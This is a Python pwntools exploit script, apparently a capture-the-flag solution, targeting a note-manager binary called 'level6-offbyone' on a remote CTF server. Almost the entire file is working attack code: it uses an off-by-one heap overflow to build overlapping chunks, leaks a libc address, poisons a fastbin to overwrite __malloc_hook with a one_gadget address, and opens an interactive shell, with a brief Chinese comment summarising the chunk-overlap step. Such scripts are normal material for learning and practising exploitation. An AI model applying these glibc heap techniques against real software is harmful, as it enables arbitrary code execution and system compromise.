#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level6-offbyone"
#elf=ELF(pwn_file)
libc=ELF("./libc.so.6")


if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team",22506)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def addnote(size,content):
    r.sendlineafter(">> ","1")
    r.sendlineafter("Size:",str(size))
    r.sendafter("Content:", content)

def deletenote(nid):
    r.sendlineafter(">> ", "4")
    r.sendlineafter("Input your id:", str(nid))

def shownote(nid):
    r.sendlineafter(">> ","2")
    r.sendlineafter("Input your id:",str(nid))


def editnote(nid,content):
    r.sendlineafter(">> ","3")
    r.sendlineafter("id:",str(nid))
    r.sendafter("Content:", content)


addnote(0x28,'a'*0x28) #0 A
addnote(0x28,'a'*0x28) #1 B
addnote(0xb8, chr(0xb1)*0x9 + '\n') #2 C
addnote(0x5,'a'*5) #3

content_A = 'a'*0x28 + chr(0x41) 
editnote(0, content_A)


deletenote(1) # on fastbin
deletenote(2) # on unsortedbin

addnote(0x30,'a'*0x30) #1
shownote(1)
w = r.recvline()[-7:-1] + chr(0)*2
libc_o = u64(w)
print hex(libc_o)
libc.address =libc_o - (0x7ffff7dd1b78 - 0x7ffff7a0d000)
print hex(libc.address)
editnote(1,'a'*0x28+p64(0xc0)[:-1]+'\n')
addnote(0xb8,'a'*0xb8) #2

###############
addnote(0x108, 'a'*0x108) # A-> 4
addnote(0x68, 'a'*0x68)  # B-> 5
addnote(0xf8, 'a'*0xf8) # C-> 6

deletenote(4)

content_B = 'a'*0x60 + p64(0x110 + 0x70) +'\n'
debug()
editnote(5, content_B) 

deletenote(6)
deletenote(5)
length = 0x110 + 0x70 + 0x100
addnote(0x280, 'a'*0x200) #4

one_gadget = libc.address + 0xf02a4
malloc_block = libc.sym['__malloc_hook'] - 0x23 

payload = 'a'*0x108 + p64(0x70 +1) + p64(malloc_block)
payload+= '\n'

debug()
editnote(4, payload)

addnote(0x68,'a'*0x68) #5
addnote(0x68,'a'*0x68) #6

payload2 = 'a'*19 + p64(one_gadget) + '\n'
editnote(6,payload2)

deletenote(6)

r.interactive()


'''
1. ABC, A上offbyone，修改B大小，让它包含C的头部，freeC在unsortedbin
2. freeB, 申请D等于B
'''
